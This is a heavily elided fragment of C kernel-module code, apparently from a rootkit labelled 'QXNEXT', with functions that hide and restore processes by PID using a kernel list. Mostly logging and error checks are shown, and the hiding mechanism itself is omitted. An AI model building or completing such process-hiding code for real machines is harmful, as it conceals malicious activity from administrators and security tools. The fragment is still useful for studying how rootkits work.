...
{
    printk(KERN_ERR "[QXNEXT] Try to hid pid %d", pid_number);
    ...
    if (!pid || IS_ERR(pid)) 
    {
        printk(KERN_ERR "[QXNEXT] Failed to find PID %d with error %ld.\n", pid_number, PTR_ERR(pid));
        return;
    }
    ...
    if (!task)
    {
        printk(KERN_ERR "[QXNEXT] Failed to find task for PID: %d\n", pid_number);
        return;
    }
    ...
    if (!this_node)
    {
        printk(KERN_ERR "[QXNEXT] Memory allocation failed for hiding PID: %d\n", pid_number);
    ...
    printk(KERN_INFO "[QXNEXT] PID: %d successfully hidden and added to the list.\n", pid_number);
    mutex_unlock(&pid_list_lock);
}
...
void restore_process(pid_t pid_number)
{
    ...
    printk(KERN_INFO "[QXNEXT] Restoring process: %d\n", pid_number);
    ...
    list_for_each_entry(entry, &hidden_pid_list_head, list)
    {
        if (entry->pid_number == pid_number)
        {
            ...
            printk(KERN_INFO "[QXNEXT] PID: %d successfully restored.\n", pid_number);
            break;
        }
    }
